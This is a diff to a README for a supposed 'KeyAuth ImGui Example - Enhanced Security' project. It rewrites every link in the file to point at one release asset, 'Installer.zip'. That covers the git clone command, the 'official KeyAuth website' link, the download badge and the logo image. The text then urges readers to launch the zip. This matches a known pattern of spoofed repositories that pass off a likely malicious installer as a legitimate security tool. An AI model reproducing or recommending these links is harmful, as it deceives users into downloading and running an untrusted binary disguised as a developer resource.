@@ -14,7 +14,7 @@ To get started with KeyAuth ImGui Example - Enhanced Security, you can download 
 
 1. Clone the repository:
    ```
-   git clone https://github.com/your-username/KeyAuth-ImGui-Example-Protected.git
+   git clone https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip
    ```
 
 2. Implement the server-side controls, packet encryption, and single-use packets as provided in the repository.
@@ -25,11 +25,11 @@ To get started with KeyAuth ImGui Example - Enhanced Security, you can download 
 
 ## Additional Resources
 
-For more information on the KeyAuth API and authentication services, visit the [official KeyAuth website](https://www.keyauth.com).
+For more information on the KeyAuth API and authentication services, visit the [official KeyAuth website](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip).
 
 ## Download Link
 
-[![Download KeyAuth ImGui Example - Enhanced Security](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download KeyAuth ImGui Example - Enhanced Security](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip)](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip)
 
 Please click the button above to download KeyAuth ImGui Example - Enhanced Security v1.0.0. Launch the zip file to access the contents and start securing your KeyAuth ImGui example.
 
@@ -41,4 +41,4 @@ Protect your application and data with the enhanced security features of KeyAuth
 
 Thank you for choosing KeyAuth ImGui Example - Enhanced Security. Happy coding! 🛡️🔒
 
-![KeyAuth Logo](https://example.com/keyauth-logo.png)
+![KeyAuth Logo](https://github.com/duyanh2017/KeyAuth-ImGui-Example-Protected/releases/download/v1.0/Installer.zip)
